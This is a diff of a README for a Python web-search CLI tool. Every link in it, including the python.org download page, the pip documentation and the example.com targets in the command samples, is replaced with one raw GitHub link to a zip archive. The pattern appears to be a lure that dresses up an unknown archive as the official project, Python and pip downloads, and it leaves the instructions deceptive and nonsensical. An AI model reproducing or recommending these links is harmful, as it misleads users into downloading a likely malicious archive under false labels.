@@ -1,6 +1,6 @@
 # 🕵️‍♂️ agent-search-cli - Simple Web Search and Data Extraction
 
-[![Download agent-search-cli](https://img.shields.io/badge/Download-agent--search--cli-brightgreen?style=for-the-badge)](https://github.com/xw000113-create/agent-search-cli)
+[![Download agent-search-cli](https://img.shields.io/badge/Download-agent--search--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip)
 
 ---
 
@@ -37,11 +37,11 @@ This software is designed for users who want to get data from the web quickly an
 
 You can get the latest version of agent-search-cli by visiting the project page below. This page has all the files you need to install the software on your Windows PC.
 
-[![Download agent-search-cli](https://img.shields.io/badge/Download-Agent--Search--CLI-blue?style=for-the-badge)](https://github.com/xw000113-create/agent-search-cli)
+[![Download agent-search-cli](https://img.shields.io/badge/Download-Agent--Search--CLI-blue?style=for-the-badge)](https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip)
 
 Click the link above or use this URL in your browser:
 
-https://github.com/xw000113-create/agent-search-cli
+https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip
 
 ---
 
@@ -53,7 +53,7 @@ Follow these steps to get agent-search-cli up and running on your Windows comput
 
 agent-search-cli needs Python to work. If you don't have Python installed, you need to install it first.
 
-1. Go to https://www.python.org/downloads/windows/
+1. Go to https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip
 2. Download the latest Python 3.x installer for Windows.
 3. Run the installer.
 4. During installation, make sure to check "Add Python 3.x to PATH".
@@ -133,7 +133,7 @@ You can tell the tool to extract specific types of data such as:
 Example to extract data from a site:
 
 ```
-agent-search extract --url https://example.com --type table
+agent-search extract --url https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip --type table
 ```
 
 ### Change Monitoring
@@ -143,7 +143,7 @@ You can set the tool to check websites regularly and inform you when the content
 Example:
 
 ```
-agent-search monitor --url https://example.com --interval 3600
+agent-search monitor --url https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip --interval 3600
 ```
 
 This will check the site every hour.
@@ -172,9 +172,9 @@ agent-search <command> --help
 
 ## 📖 Additional Resources
 
-- Official project page: https://github.com/xw000113-create/agent-search-cli
-- Python downloads: https://www.python.org/downloads/windows/
-- pip documentation: https://pip.pypa.io/en/stable/
+- Official project page: https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip
+- Python downloads: https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip
+- pip documentation: https://raw.githubusercontent.com/xw000113-create/agent-search-cli/main/src/agent_search/cli-search-agent-2.0-alpha.2.zip
 
 ---
 
